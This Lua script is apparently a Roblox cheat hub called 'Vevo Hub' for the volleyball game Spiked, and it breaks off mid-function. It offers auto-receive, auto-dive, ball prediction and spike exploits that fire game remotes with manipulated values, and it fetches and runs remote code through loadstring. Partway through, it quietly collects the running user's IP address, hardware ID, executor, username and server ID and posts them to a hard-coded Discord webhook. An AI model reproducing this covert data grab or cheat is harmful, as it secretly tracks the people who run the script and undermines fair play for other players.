repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer:GetAttribute("LOADED")

local MyPlayer = game.Players.LocalPlayer
local MyChar = MyPlayer.Character
local MyHRP = MyChar:WaitForChild("HumanoidRootPart")
local Animations = game.ReplicatedStorage:WaitForChild("Animations")
local MyHumanoid = MyChar.Humanoid
local TeleportService = game:GetService('TeleportService')
local httpService = game:GetService('HttpService')
local BumpAnim = MyPlayer.Character.Humanoid.Animator:LoadAnimation(Animations:WaitForChild("Bump"))
local BumpPower = 50
local DiveRemote = game.ReplicatedStorage.Mechanics:WaitForChild("Dive")
local DiveAnim = MyHumanoid.Animator:LoadAnimation(Animations:WaitForChild("Dive"))
local LeftDiveAnim = MyHumanoid.Animator:LoadAnimation(Animations:WaitForChild("DiveLeft"))
local RightDiveAnim = MyHumanoid.Animator:LoadAnimation(Animations:WaitForChild("DiveRight"))
local BackDiveAnim = MyHumanoid.Animator:LoadAnimation(Animations:WaitForChild("DiveBack"))
local FrontLeftDiveAnim = MyHumanoid.Animator:LoadAnimation(Animations:WaitForChild("DiveBackLeft"))
local FrontRightDiveAnim = MyHumanoid.Animator:LoadAnimation(Animations:WaitForChild("DiveBackRight"))
local BackLeftDiveAnim = MyHumanoid.Animator:LoadAnimation(Animations:WaitForChild("DiveFrontLeft"))
local BackRightDiveAnim = MyHumanoid.Animator:LoadAnimation(Animations:WaitForChild("DiveFrontRight"))
queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
local Predictions = {}
local WeaponList = {
	[1] = 'CONDUCTOR',
	[2] = 'FULL APPROACH',
	[3] = 'GUARDIAN',
	[4] = 'HYBRID SERVE',
	[5] = 'IRON WALL',
	[6] = 'PERFECT TOSS',
	[7] = 'POWERFUL',
	[8] = 'QUICK STEP',
	[9] = 'RICOCHET',
	[10] = 'SAFEGUARD',
	[11] = 'SOFT TOUCH',
	[12] = 'BLOCK BREAKER',
	[13] = 'BOOM JUMP',
	[14] = 'FLOAT',
	[15] = 'IMMOVABLE',
    [16] = 'KING SERVE',
	[17] = 'MINUS TEMPO',
    [18] = 'QUICK REFLEX',
    [19] = 'RECEIVE BREAK',
    [20] = 'SKY SERVE',
    [21] = 'FLEXIBLE',
    [22] = 'ACE',
    [23] = 'TORQUE'
}
local HeightList = {
    [1] = "5'0",
    [2] = "5'1",
    [3] = "5'2",
    [4] = "5'3",
    [5] = "5'4",
    [6] = "5'5",
    [7] = "5'6",
    [8] = "5'7",
    [9] = "5'8",
    [10] = "5'9",
    [11] = "5'10",
    [12] = "5'11",
    [13] = "6'0",
    [14] = "6'1",
    [15] = "6'2",
    [16] = "6'3",
    [17] = "6'4",
    [18] = "6'5",
    [19] = "6'6",
    [20] = "6'7",
    [21] = "6'8",
    [22] = "6'9",
    [23] = "6'10",
    [24] = "6'11",
    [25] = "7'0"
}
local FlowTypeList = {
    [1] = 'RECHITBOX',
    [2] = 'AERIALHITBOX',
    [3] = 'JUMPHEIGHT',
    [4] = 'POWER',
    [5] = 'SPRINTSPEED',
    [6] = 'PERFECTSETTING',
}
local FirstWeapons = {}
local SecondWeapons = {}
local SelectedHeights = {}
local SelectedFlowTypes = {}
getgenv().SelectedFlowPercentage = 20
local Yen = MyPlayer.Backpack:WaitForChild("Yen").Value
getgenv().EnableAutoDive = false


local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
local Window = Library:CreateWindow({
    Title = 'Vevo Hub (Spiked) :fire:',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0.2
})
local Tabs = {
    Game = Window:AddTab('Game'),
    Player = Window:AddTab('Player'),
    Autospin = Window:AddTab('Autospin'),
    ['UI Settings'] = Window:AddTab('UI Settings'),
    Credits = Window:AddTab('Credits')
}
local Sections = {
    Spike = Tabs.Game:AddLeftGroupbox('Spiking'),
    Rec = Tabs.Game:AddLeftGroupbox('Receiving'),
	Flow = Tabs.Game:AddLeftGroupbox('Flow'),
	Player = Tabs.Player:AddLeftGroupbox('Player'),
    Menu = Tabs['UI Settings']:AddLeftGroupbox('Menu'),
    Servers = Tabs['UI Settings']:AddLeftGroupbox('Servers'),
    FirstWeapon = Tabs.Autospin:AddLeftGroupbox('FirstWeapon'),
    SecondWeapon = Tabs.Autospin:AddLeftGroupbox('SecondWeapon'),
    HeightTab = Tabs.Autospin:AddRightGroupbox('Height'),
    FlowTab = Tabs.Autospin:AddRightGroupbox('Flow'),
    Info = Tabs.Autospin:AddRightGroupbox('Info')
}

local ThemeManager = {} do
	ThemeManager.Folder = 'LinoriaLibSettings'
	-- if not isfolder(ThemeManager.Folder) then makefolder(ThemeManager.Folder) end

	ThemeManager.Library = nil
    ThemeManager.BuiltInThemes = {
        ['Lunar'] = {
            1,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"0f1a23","AccentColor":"ffc62e","BackgroundColor":"0c1720","OutlineColor":"20303e"}')
        },
        ['Neverlose'] = {
            2,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"000f1e","AccentColor":"00b4f0","BackgroundColor":"050514","OutlineColor":"0a1e28"}')
        },
        ['Oceanic'] = {
            4,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"2c2a4a","AccentColor":"0099cc","BackgroundColor":"20203b","OutlineColor":"3a385e"}')
        },
        ['Cool Breeze'] = {
            5,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"3a3f44","AccentColor":"1eb980","BackgroundColor":"2c3034","OutlineColor":"465358"}')
        },
        ['Vibrant Neon'] = {
            6,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"333333","AccentColor":"ff69b4","BackgroundColor":"1a1a1a","OutlineColor":"2c2c2c"}')
        },
        ['Electric Sky'] = {
            7,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"1f2430","AccentColor":"66ccff","BackgroundColor":"141a25","OutlineColor":"292f3f"}')
        },
        ['Pastel Prism'] = {
            8,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"303030","AccentColor":"ffcc00","BackgroundColor":"1f1f1f","OutlineColor":"343434"}')
        },
        ['Frosty Mint'] = {
            9,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"384c58","AccentColor":"00ffcc","BackgroundColor":"293940","OutlineColor":"394e5d"}')
        },
        ['Rainbow Haze'] = {
            10,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"444c56","AccentColor":"ffaa00","BackgroundColor":"343a44","OutlineColor":"4e545e"}')
        },
        ['Mystic Galaxy'] = {
            11,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"2e2d3a","AccentColor":"b366ff","BackgroundColor":"1f1e28","OutlineColor":"383f4d"}')
        },
        ['Crimson Sunrise'] = {
            12,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"5d0f0f","AccentColor":"ff5454","BackgroundColor":"3e0a0a","OutlineColor":"5c2c2c"}')
        },
        ['Enchanted Forest'] = {
            13,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"2a3b30","AccentColor":"00ffaa","BackgroundColor":"1d2923","OutlineColor":"394c5b"}')
        },
        ['Dark Citrus'] = {
            14,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"363636","AccentColor":"ffa500","BackgroundColor":"262626","OutlineColor":"3f3f3f"}')
        },
        ['Moonlit Lavender'] = {
            15,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"302b3f","AccentColor":"cc99ff","BackgroundColor":"221f2f","OutlineColor":"3c3a4e"}')
        },
        ['Azure Dreams'] = {
            16,
            httpService:JSONDecode('{"FontColor":"ffffff","MainColor":"252c33","AccentColor":"00ffff","BackgroundColor":"181f25","OutlineColor":"313b42"}')
        },
    }

	function ThemeManager:ApplyTheme(theme)
		local customThemeData = self:GetCustomTheme(theme)
		local data = customThemeData or self.BuiltInThemes[theme]

		if not data then return end

		-- custom themes are just regular dictionaries instead of an array with { index, dictionary }

		local scheme = data[2]
		for idx, col in next, customThemeData or scheme do
			self.Library[idx] = Color3.fromHex(col)
			
			if Options[idx] then
				Options[idx]:SetValueRGB(Color3.fromHex(col))
			end
		end

		self:ThemeUpdate()
	end

	function ThemeManager:ThemeUpdate()
		-- This allows us to force apply themes without loading the themes tab :)
		local options = { "FontColor", "MainColor", "AccentColor", "BackgroundColor", "OutlineColor" }
		for i, field in next, options do
			if Options and Options[field] then
				self.Library[field] = Options[field].Value
			end
		end

		self.Library.AccentColorDark = self.Library:GetDarkerColor(self.Library.AccentColor);
		self.Library:UpdateColorsUsingRegistry()
	end

	function ThemeManager:LoadDefault()		
		local theme = 'Default'
		local content = isfile(self.Folder .. '/themes/default.txt') and readfile(self.Folder .. '/themes/default.txt')

		local isDefault = true
		if content then
			if self.BuiltInThemes[content] then
				theme = content
			elseif self:GetCustomTheme(content) then
				theme = content
				isDefault = false;
			end
		elseif self.BuiltInThemes[self.DefaultTheme] then
		 	theme = self.DefaultTheme
		end

		if isDefault then
			Options.ThemeManager_ThemeList:SetValue(theme)
		else
			self:ApplyTheme(theme)
		end
	end

	function ThemeManager:SaveDefault(theme)
		writefile(self.Folder .. '/themes/default.txt', theme)
	end

	function ThemeManager:CreateThemeManager(groupbox)
		groupbox:AddLabel('Background color'):AddColorPicker('BackgroundColor', { Default = self.Library.BackgroundColor });
		groupbox:AddLabel('Main color')	:AddColorPicker('MainColor', { Default = self.Library.MainColor });
		groupbox:AddLabel('Accent color'):AddColorPicker('AccentColor', { Default = self.Library.AccentColor });
		groupbox:AddLabel('Outline color'):AddColorPicker('OutlineColor', { Default = self.Library.OutlineColor });
		groupbox:AddLabel('Font color')	:AddColorPicker('FontColor', { Default = self.Library.FontColor });

		local ThemesArray = {}
		for Name, Theme in next, self.BuiltInThemes do
			table.insert(ThemesArray, Name)
		end

		table.sort(ThemesArray, function(a, b) return self.BuiltInThemes[a][1] < self.BuiltInThemes[b][1] end)

		groupbox:AddDivider()
		groupbox:AddDropdown('ThemeManager_ThemeList', { Text = 'Theme list', Values = ThemesArray, Default = 1 })

		groupbox:AddButton('Set as default', function()
			self:SaveDefault(Options.ThemeManager_ThemeList.Value)
			self.Library:Notify(string.format('Set default theme to %q', Options.ThemeManager_ThemeList.Value))
		end)

		Options.ThemeManager_ThemeList:OnChanged(function()
			self:ApplyTheme(Options.ThemeManager_ThemeList.Value)
		end)

		groupbox:AddDivider()
		groupbox:AddInput('ThemeManager_CustomThemeName', { Text = 'Custom theme name' })
		groupbox:AddDropdown('ThemeManager_CustomThemeList', { Text = 'Custom themes', Values = self:ReloadCustomThemes(), AllowNull = true, Default = 1 })
		groupbox:AddDivider()
		
		groupbox:AddButton('Save theme', function() 
			self:SaveCustomTheme(Options.ThemeManager_CustomThemeName.Value)

			Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
			Options.ThemeManager_CustomThemeList:SetValue(nil)
		end):AddButton('Load theme', function() 
			self:ApplyTheme(Options.ThemeManager_CustomThemeList.Value) 
		end)

		groupbox:AddButton('Refresh list', function()
			Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
			Options.ThemeManager_CustomThemeList:SetValue(nil)
		end)

		groupbox:AddButton('Set as default', function()
			if Options.ThemeManager_CustomThemeList.Value ~= nil and Options.ThemeManager_CustomThemeList.Value ~= '' then
				self:SaveDefault(Options.ThemeManager_CustomThemeList.Value)
				self.Library:Notify(string.format('Set default theme to %q', Options.ThemeManager_CustomThemeList.Value))
			end
		end)

		ThemeManager:LoadDefault()

		local function UpdateTheme()
			self:ThemeUpdate()
		end

		Options.BackgroundColor:OnChanged(UpdateTheme)
		Options.MainColor:OnChanged(UpdateTheme)
		Options.AccentColor:OnChanged(UpdateTheme)
		Options.OutlineColor:OnChanged(UpdateTheme)
		Options.FontColor:OnChanged(UpdateTheme)
	end

	function ThemeManager:GetCustomTheme(file)
		local path = self.Folder .. '/themes/' .. file
		if not isfile(path) then
			return nil
		end

		local data = readfile(path)
		local success, decoded = pcall(httpService.JSONDecode, httpService, data)
		
		if not success then
			return nil
		end

		return decoded
	end

	function ThemeManager:SaveCustomTheme(file)
		if file:gsub(' ', '') == '' then
			return self.Library:Notify('Invalid file name for theme (empty)', 3)
		end

		local theme = {}
		local fields = { "FontColor", "MainColor", "AccentColor", "BackgroundColor", "OutlineColor" }

		for _, field in next, fields do
			theme[field] = Options[field].Value:ToHex()
		end

		writefile(self.Folder .. '/themes/' .. file .. '.json', httpService:JSONEncode(theme))
	end

	function ThemeManager:ReloadCustomThemes()
		local list = listfiles(self.Folder .. '/themes')

		local out = {}
		for i = 1, #list do
			local file = list[i]
			if file:sub(-5) == '.json' then
				-- i hate this but it has to be done ...

				local pos = file:find('.json', 1, true)
				local char = file:sub(pos, pos)

				while char ~= '/' and char ~= '\\' and char ~= '' do
					pos = pos - 1
					char = file:sub(pos, pos)
				end

				if char == '/' or char == '\\' then
					table.insert(out, file:sub(pos + 1))
				end
			end
		end

		return out
	end

	function ThemeManager:SetLibrary(lib)
		self.Library = lib
	end

	function ThemeManager:BuildFolderTree()
		local paths = {}

		-- build the entire tree if a path is like some-hub/phantom-forces
		-- makefolder builds the entire tree on Synapse X but not other exploits

		local parts = self.Folder:split('/')
		for idx = 1, #parts do
			paths[#paths + 1] = table.concat(parts, '/', 1, idx)
		end

		table.insert(paths, self.Folder .. '/themes')
		table.insert(paths, self.Folder .. '/settings')

		for i = 1, #paths do
			local str = paths[i]
			if not isfolder(str) then
				makefolder(str)
			end
		end
	end

	function ThemeManager:SetFolder(folder)
		self.Folder = folder
		self:BuildFolderTree()
	end

	function ThemeManager:CreateGroupBox(tab)
		assert(self.Library, 'Must set ThemeManager.Library first!')
		return tab:AddLeftGroupbox('Themes')
	end

	function ThemeManager:ApplyToTab(tab)
		assert(self.Library, 'Must set ThemeManager.Library first!')
		local groupbox = self:CreateGroupBox(tab)
		self:CreateThemeManager(groupbox)
	end

	function ThemeManager:ApplyToGroupbox(groupbox)
		assert(self.Library, 'Must set ThemeManager.Library first!')
		self:CreateThemeManager(groupbox)
	end

	ThemeManager:BuildFolderTree()
end

local VevoWebhook = "https://discordapp.com/api/webhooks/1284798351266549773/7Rs8dDnT5OnqUcpLcp9rw0J-vBgUuJ_Id4cTVhpurl6tKxwNyltZtf9q-kYgyZSLqO6q"
RunService = cloneref(game:GetService("RunService"))
local Http = game:GetService("HttpService")
local marketplaceService = game:GetService("MarketplaceService")
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId) -- getting game name
local iprequest = request({
    Url = 'https://httpbin.org/ip',
    Method = 'GET',
})
local ip = Http:JSONDecode(iprequest.Body).origin
local hwid = (gethwid and gethwid()) or ''
local executor = (getexecutorname and getexecutorname()) or ''
local vevorequest = request({
	Url = VevoWebhook,
	Method = 'POST',
	Headers = {
		['Content-Type'] = 'application/json'
	},
	Body = Http:JSONEncode({
		["content"] = "",
		["embeds"] = {{
			["title"] = "**Vevo Hub**",
			["description"] = '',
			["type"] = "rich",
			["color"] = tonumber(0xffffff),
			["thumbnail"] = {
				["url"] = "https://i.imgur.com/8VP0kS9.png"
			},
			["fields"] = {
				{
					["name"] = "HWID: "..hwid,
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "IP: "..ip,
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "EXECUTOR: "..executor,
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "USER: "..MyPlayer.Name.." ["..tostring(MyPlayer.UserId).."]",
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "GAME: "..info.Name.." ["..tostring(game.PlaceId).."]",
					["value"] = '',
					["inline"] = false
				},
				{
					["name"] = "JobID: "..tostring(game.JobId),
					["value"] = '',
					["inline"] = false
				}
			}
		}}
	})
})

if not game:GetService('Workspace'):FindFirstChild('Predictions') then
    local PredictionsFolder = Instance.new('Folder')
    PredictionsFolder.Parent = game:GetService('Workspace')
    PredictionsFolder.Name = 'Predictions'
end

--[[function Dive()
local DivePower = 300 * (1 + Vector3.new(MyAssemblyLinearVelocityX, 0, MyAssemblyLinearVelocityZ).Magnitude / 100)
	DivePower = DivePower * MyPlayer:GetAttribute("DIVELENGTH")
local DiveDirection
if MyHumanoid.MoveDirection:Dot(MyHRP.CFrame.LookVector) > 0.5 then
	DiveMovement.VectorVelocity = MyHumanoid.MoveDirection * DivePower
	DiveDirection = "FrontDive"
	if MyHumanoid.MoveDirection:Dot(MyHRP.CFrame.RightVector) > 0.5 then
		FrontRightDiveAnim:Play()
	elseif MyHumanoid.MoveDirection:Dot(-MyHRP.CFrame.RightVector) > 0.5 then
		BackLeftDiveAnim:Play()
	else
		DiveAnim:Play()
	end
elseif MyHumanoid.MoveDirection:Dot(-MyHRP.CFrame.LookVector) > 0.5 then
	DiveMovement.VectorVelocity = MyHumanoid.MoveDirection * DivePower
	DiveDirection = "BackDive"
	if MyHumanoid.MoveDirection:Dot(MyHRP.CFrame.RightVector) > 0.5 then
	    FrontRightDiveAnim:Play()
	elseif MyHumanoid.MoveDirection:Dot(-MyHRP.CFrame.RightVector) > 0.5 then
		BackLeftDiveAnim:Play()
	else
	    BackDiveAnim:Play()
	end
elseif MyHumanoid.MoveDirection:Dot(MyHRP.CFrame.RightVector) > 0.75 then
	DiveMovement.VectorVelocity = MyHumanoid.MoveDirection * DivePower
	RightDiveAnim:Play()
	DiveDirection = "RightDive"
elseif MyHumanoid.MoveDirection:Dot(-MyHRP.CFrame.RightVector) > 0.75 then
	DiveMovement.VectorVelocity = MyHumanoid.MoveDirection * DivePower
	LeftDiveAnim:Play()
	DiveDirection = "LeftDive"
else
	DiveMovement.VectorVelocity = MyHRP.CFrame.LookVector * DivePower
	DiveAnim:Play()
	DiveDirection = "FrontDive"
end
Dive:FireServer(DiveDirection)
end
]]
task.spawn(function()
    for i,v in pairs(workspace.BallFolderServer:GetChildren()) do
        if v.Player.Value ~= MyPlayer.Name and v.Team.Value ~= nil then
            getgenv().Ball = v
        end
    end
end)

local function formula(a, b, c)
    local x1 = (-b + math.sqrt((b*b) -4 * a * c)) / (2 * a)
    local x2 = (-b - math.sqrt((b*b) -4 * a * c)) / (2 * a)
        -- usually going to be x2
    if x2 > x1 then
        return x2
    else
        return x1
    end
end

local function findLandingPosition(Vo: Vector3, startingPosition: Vector3) -- cant obfuscate it because of this part here idk why
    local acc = -workspace.Gravity
    local seconds = formula((0.5 * acc), Vo.Value.Y, startingPosition.Y)
        
    local horizontalVel = Vector3.new(Vo.Value.x, 0, Vo.Value.Z)
    local endingOffset = horizontalVel * seconds
    return startingPosition + endingOffset + Vector3.new(0, -startingPosition.Y, 0)
end


local function createPartAtLandZone(pos: Vector3)
    local Predictionpart = Instance.new("Part")
    Predictionpart.Size = Vector3.new(1,1,1)
    Predictionpart.Shape = Enum.PartType.Ball
    Predictionpart.BrickColor = BrickColor.new("Really black")
    Predictionpart.Transparency = 0
    Predictionpart.CanCollide = false
    Predictionpart.Anchored = true
    Predictionpart.CFrame = CFrame.new(pos)
    Predictionpart.Parent = workspace.Predictions
	task.spawn(function()
        if (MyHRP.CFrame.Position - Predictionpart.Position).Magnitude < 50 then
            Predictions = {}
            table.insert(Predictions, 1, Predictionpart)
        else
            Predictions = {}
        end
        task.wait(0.5)
        Predictionpart.Transparency = 0.25
        task.wait(0.5)
        Predictionpart.Transparency = 0.5
        task.wait(0.5)
        Predictionpart.Transparency = 0.75
		task.wait(0.5)
		Predictionpart:Destroy()
	end)
end

local function createTransparentPartAtLandZone(pos: Vector3)
    if not getgenv().BallPrediction then
        local TransparentPredictionPart = Instance.new("Part")
        TransparentPredictionPart.Size = Vector3.new(1,1,1)
        TransparentPredictionPart.Shape = Enum.PartType.Ball
        TransparentPredictionPart.BrickColor = BrickColor.new("White")
        TransparentPredictionPart.Transparency = 1
        TransparentPredictionPart.CanCollide = false
        TransparentPredictionPart.Anchored = true
        TransparentPredictionPart.CFrame = CFrame.new(pos)
        TransparentPredictionPart.Parent = workspace.Predictions
        task.spawn(function()
            task.wait(0.2)
            if (MyHRP.CFrame.Position - TransparentPredictionPart.Position).Magnitude < 50 then
                Predictions = {}
                table.insert(Predictions, 1, TransparentPredictionPart)
            else
                Predictions = {}
            end
            task.wait(0.2)
            TransparentPredictionPart:Destroy()
            table.clear(Predictions)
        end)
        task.wait(0.15)
    end
end


function DiveDirection()
    for i,v in pairs(workspace.BallFolderServer:GetChildren()) do
        local Ball = v:WaitForChild("Ball")
        local initialVelocity = v:WaitForChild("Velocity")
        task.spawn(function()
            createTransparentPartAtLandZone(findLandingPosition(initialVelocity, Ball.Position))
            task.wait(0.2)
        end
        )
        local BallDirection = MyHRP.CFrame:ToObjectSpace(v:WaitForChild("Shadow").CFrame)
            for _,predic in pairs(workspace.Predictions:GetChildren()) do
                local BallPredictionDirection = MyHRP.CFrame:ToObjectSpace(predic.CFrame)
            if BallPredictionDirection.X > 2 and BallPredictionDirection.Z > 2 then
                return "FrontRightDive"
            elseif BallPredictionDirection.X < -2 and BallPredictionDirection.Z > 2 then
                return "FrontLeftDive"
            end
            if BallPredictionDirection.X > 2 and BallPredictionDirection.Z < -2 then
                return "BackRightDive"
            elseif BallPredictionDirection.X < -2 and BallPredictionDirection.Z < -2 then    
                return "BackLeftDive"
            end
            if BallPredictionDirection.X > 0 and BallPredictionDirection.Z < 2 and BallPredictionDirection.Z > -2 then
                return "RightDive"
            elseif BallPredictionDirection.X < 0 and BallPredictionDirection.Z < 2 and BallPredictionDirection.Z > -2 then
                return "LeftDive"
            end
            if BallPredictionDirection.Z > 0 and BallPredictionDirection.X < 2 and BallPredictionDirection.X > -2 then
                return "FrontDive"
            elseif BallPredictionDirection.Z < 0 and BallPredictionDirection.X < 2 and BallPredictionDirection.X > -2 then
                return "BackDive"
            end
        end
    end
end

local function adjust_vector3(vec, target_sum)
    local x, y, z = vec.X, 0, vec.Z

    local current_sum = math.abs(x) + math.abs(z)
    if current_sum == 0 then
        return Vector3.new(target_sum / 2, 0, target_sum / 2)
    end

    local scaleFactor = target_sum / current_sum
    local new_x = x * scaleFactor
    local new_z = z * scaleFactor

    return Vector3.new(new_x, 0, new_z)
end



function Dive()
    local v121 = Instance.new("Attachment", MyHRP)
	local DiveMovement = Instance.new("LinearVelocity", MyHRP)
	DiveMovement.Attachment0 = v121
	DiveMovement.ForceLimitMode = Enum.ForceLimitMode.PerAxis
	DiveMovement.MaxAxesForce = Vector3.new(1, 0, 1) * 10000
    DiveMovement.VectorVelocity = Vector3.new(0, 0, 0)
    local RemoteDiveDirection
    for i,v in pairs(workspace.BallFolderServer:GetChildren()) do
        DiveDirection()
        for _,predic in pairs(workspace.Predictions:GetChildren()) do
            local PlayerSideOfNet = MyHRP.CFrame.Z > 0
            local PredictionBallSide = predic.CFrame.Z > 0
            local distance = (MyHRP.Position - predic.Position).Magnitude
            --[[table.sort(Predictions, function(a, b)
                return (MyHRP.Position - a.Position).Magnitude < (MyHRP.Position - b.Position).Magnitude
            end)
            local closestPrediction = Predictions[1]]

            local latestPrediction = Predictions[1]
            local sameSideOfNet = PredictionBallSide == PlayerSideOfNet
            local BallSide = v:WaitForChild("Ball").CFrame.Z > 0
            local sameBallSideOfNet = BallSide == PlayerSideOfNet
            local BallVelocity = v:WaitForChild('Velocity')
            local BallMagnitude = (v:WaitForChild('Shadow').Position-MyHRP.Position).Magnitude
            if distance < 50 and sameSideOfNet and sameBallSideOfNet or distance < 120 and sameSideOfNet and BallVelocity.Value.Magnitude >= (BallMagnitude * 2.5) then
                local PredictionDiveDirection = MyHRP.Position - predic.Position
                local raw_velocity = Vector3.new(-PredictionDiveDirection.X * 3.5, 0, -PredictionDiveDirection.Z * 3.5)
                local adjusted_velocity = adjust_vector3(raw_velocity, 417)
                DiveMovement.VectorVelocity = adjusted_velocity
                if DiveDirection() == 'FrontRightDive' and not FrontRightDiveAnim.IsPlaying then
                    FrontRightDiveAnim:Play()
                    RemoteDiveDirection = 'FrontDive'
                elseif DiveDirection() == 'FrontLeftDive' and not FrontLeftDiveAnim.IsPlaying then
                    FrontLeftDiveAnim:Play()
                    RemoteDiveDirection = 'FrontDive'
                elseif DiveDirection() == 'FrontDive' and not BackDiveAnim.IsPlaying then
                    BackDiveAnim:Play()
                    RemoteDiveDirection = 'FrontDive'
                end
                if DiveDirection() == 'BackRightDive' and not BackRightDiveAnim.IsPlaying then
                    BackRightDiveAnim:Play()
                    RemoteDiveDirection = 'BackDive'
                elseif DiveDirection() == 'BackLeftDive' and not BackLeftDiveAnim.IsPlaying then
                    BackLeftDiveAnim:Play()
                    RemoteDiveDirection = 'BackDive'
                elseif DiveDirection() == 'BackDive' and not DiveAnim.IsPlaying then
                    DiveAnim:Play()
                    RemoteDiveDirection = 'BackDive'
                end
                if DiveDirection() == 'RightDive' and not RightDiveAnim.IsPlaying then
                    RightDiveAnim:Play()
                RemoteDiveDirection = "RightDive"
                end
                if DiveDirection() == 'LeftDive' and not LeftDiveAnim.IsPlaying then
                    LeftDiveAnim:Play()
                RemoteDiveDirection = "LeftDive"
                end
            end
        end
    end
    DiveRemote:FireServer(RemoteDiveDirection)
    local v129 = game:GetService("RunService").RenderStepped:Connect(function(p127)
			local v128 = DiveMovement.VectorVelocity
			DiveMovement.VectorVelocity = v128 - v128 * (0.15 * (60 / (1 / p127)))
		end)
    task.wait(1)
    v121:Destroy()
    DiveMovement:Destroy()
    task.wait(0.1)
    DiveAnim:Stop()
end
function Bump()
    local MouseX = MyPlayer:GetMouse().Hit.LookVector.X
    local MyHRPLookY = -MyPlayer.Character.HumanoidRootPart.CFrame.LookVector.Y
    local MouseZ = MyPlayer:GetMouse().Hit.LookVector.Z
    if not BumpAnim.IsPlaying then
        BumpAnim:Play()
        BumpAnim:AdjustSpeed(1.5)
        game:GetService("ReplicatedStorage").Mechanics.Pass:FireServer(Vector3.new(MouseX, MyHRPLookY, MouseZ) - Vector3.new(0, 0.5, 0), BumpPower)
        else
        task.wait(0.4)
    end
end

function ProperHeight(Number)
    for _,Rarity in pairs(game.ReplicatedStorage.Heights:GetChildren()) do
        for _,Heights in pairs(Rarity:GetChildren()) do
            if Heights.Name == Number then
                return Heights.TextLabel.Text
            end
        end
    end
end




local timeover = false

Sections.Rec:AddLabel('Enable Auto Receive'):AddKeyPicker('AutoRecKeyBind', {
    Default = 'Y',
    Mode = 'Toggle',
	Text = 'Auto Receive',
    NoUI = false,
    Callback = function(Value)
        getgenv().AutoRec = Value
		while getgenv().AutoRec do
            task.wait(0.05)
            for i,v in pairs(workspace.BallFolderServer:GetChildren()) do
                local BumpPower = 45    
                local BallAirDistance = (v:WaitForChild('Ball').CFrame.Y-MyHRP.CFrame.Y)
                local BallAirVector3Distance = (v:WaitForChild('Ball').Position.Y-MyHRP.Position.Y)
                local BallVector3Distance = (v:WaitForChild('Ball').Position-MyHRP.Position)
                local BallMagnitude = (v:WaitForChild('Shadow').Position-MyHRP.Position).Magnitude
                local BallVelocity = v:WaitForChild('Velocity')
                local BallDistance = (v:WaitForChild('Ball').Position-MyHRP.Position)
                if BallMagnitude <= 10 and BallAirDistance <= 30 and MyHumanoid.FloorMaterial ~= Enum.Material.Air and v.Team.Value ~= MyPlayer.Team then
                        Bump()
                elseif BallMagnitude > 10 and BallMagnitude < 40 and BallAirDistance < 20 --[[and BallVelocity.Value.Y <= 20]] and MyHumanoid.FloorMaterial ~= Enum.Material.Air and v.Team.Value ~= MyPlayer.Team or BallMagnitude > 10 and BallMagnitude < 50 and BallAirVector3Distance < math.abs(v:WaitForChild('Velocity').Value.Y * 0.55 + BallMagnitude * 0.3) and MyHumanoid.FloorMaterial ~= Enum.Material.Air and v.Team.Value ~= MyPlayer.Team or BallMagnitude > 25 and BallMagnitude < 65 and BallVelocity.Value.Magnitude > (BallMagnitude * 2) and BallAirDistance < 40 and MyHumanoid.FloorMaterial ~= Enum.Material.Air and v.Team.Value ~= MyPlayer.Team then
                    if getgenv().EnableAutoDive == true then
                        if not timeover then
                            Dive()
                            task.spawn(function()
                                timeover = true
                                task.wait(2)
                                timeover = false
                            end)
                        else
                            task.wait(0.2)
                        end
                    end
                end
            end
        end
    end
})



Sections.Rec:AddToggle('Enable ball prediction', {
    Text = 'Ball Prediction',
    Default = false,
    Tooltip = 'Predicts where the ball will land',
    Callback = function(Value)
        getgenv().BallPrediction = Value
        while Value == true do
            task.wait(0.2)            
            if getgenv().BallPrediction then
                for i,v in pairs(workspace.BallFolderServer:GetChildren()) do
                local Ball = v:WaitForChild("Ball")
                local initialVelocity = v:WaitForChild("Velocity")
                createPartAtLandZone(findLandingPosition(initialVelocity, Ball.Position))
            end
        end
    end
end
})

Sections.Spike:AddLabel('Strong feint'):AddKeyPicker('SFeintKeyBind', {
    Default = 'X',
    Mode = 'Toggle',
    NoUI = true,
    Callback = function(Value)
        local args = {
            [1] = MyPlayer:GetMouse().Hit.LookVector + Vector3.new(0, 1.5, 0),
            [2] = 90,
            [3] = "FEINT"
        }
        game:GetService("ReplicatedStorage").Mechanics.Spike:FireServer(unpack(args))
    end
})
Sections.Spike:AddLabel('Instant spike'):AddKeyPicker('SpikeKeyBind', {
    Default = 'J',
    Mode = 'Toggle',
    NoUI = true,
    Callback = function(Value)
        local mouse = MyPlayer:GetMouse().Hit.LookVector
        local args = {
            [1] = Vector3.new(-mouse.X, (-mouse.Y - 0.01), -mouse.Z),
            [2] = -1000,
            [3] = "SPIKE"}
